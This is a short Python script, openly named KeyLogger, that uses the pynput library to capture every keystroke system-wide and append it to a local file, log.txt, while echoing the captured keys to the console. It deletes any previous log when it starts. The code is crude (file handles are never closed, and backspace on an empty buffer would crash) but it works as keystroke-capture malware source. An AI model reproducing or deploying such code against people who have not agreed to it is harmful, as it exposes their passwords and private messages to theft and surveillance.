from pynput.keyboard import Key, Listener
from time import sleep
import os




class KeyLogger():    

    def __init__(self):

        self.log = "INITIALING...   "
        self.current_key = []
        if os.path.exists("log.txt"):
            os.remove("log.txt")
        
    def on_press(self, key):

        file = open("log.txt","a")

        try:

            self.current_key.append(str(key.char))

            file.write(str(key).replace("'",""))

        except AttributeError:

            if key != Key.backspace:
                print(self.current_key)
                

            if key == Key.space:

                self.current_key.append(" ")
                file.write(" ")

            elif key == Key.esc:

                self.current_key.append("ESC")
                file.write("ESC")

            elif key == Key.enter:

                self.current_key.append("\n")
                file.write("\n")

            elif key == Key.backspace:

                self.current_key.pop()
                print("apagou")

            else:
                
                self.current_key.append(" " + str(key) + " ")
                file.write(""+str(key)+"")

        
    
            

           
    def run(self):
        with Listener(on_press=self.on_press) as keyboard_listener:
            keyboard_listener.join()
            sleep(10)
            keyboard_listener.stop()
keylogger = KeyLogger()
keylogger.run()
